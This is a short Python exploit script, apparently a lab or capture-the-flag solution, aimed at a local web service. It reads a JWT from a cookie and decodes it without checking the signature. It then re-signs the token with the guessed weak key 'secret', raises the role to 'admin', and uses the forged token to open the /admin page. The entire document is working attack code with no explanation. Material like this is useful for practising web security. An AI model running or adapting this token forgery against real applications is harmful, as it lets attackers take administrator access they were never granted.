import jwt
import requests
BASE_URL = 'http://127.0.0.1:5001'
HOME_URL = f'{BASE_URL}/'
ADMIN_URL = f'{BASE_URL}/admin'
SECRET_KEY = 'secret'
session = requests.Session()
response = session.get(HOME_URL)
token = response.cookies.get('token')
if not token:
    print("[!] No token found in cookies!")
    exit(1)
print(f"[+] Got token from cookie: {token}")
decoded = jwt.decode(token, options={"verify_signature": False})
print(f"[+] Decoded token: {decoded}")
forged_payload = {
    'user': decoded.get('user', 'guest'),
    'role': 'admin',
    'exp': decoded['exp']
}
forged_token = jwt.encode(forged_payload, SECRET_KEY, algorithm='HS256')
if isinstance(forged_token, bytes):
    forged_token = forged_token.decode()
print(f"[+] Forged admin token: {forged_token}")
headers = {
    'Authorization': forged_token
}
admin_response = requests.get(ADMIN_URL, headers=headers)
print(f"[+] Admin response status: {admin_response.status_code}")
print(f"[+] Admin response content:\n{admin_response.text}")
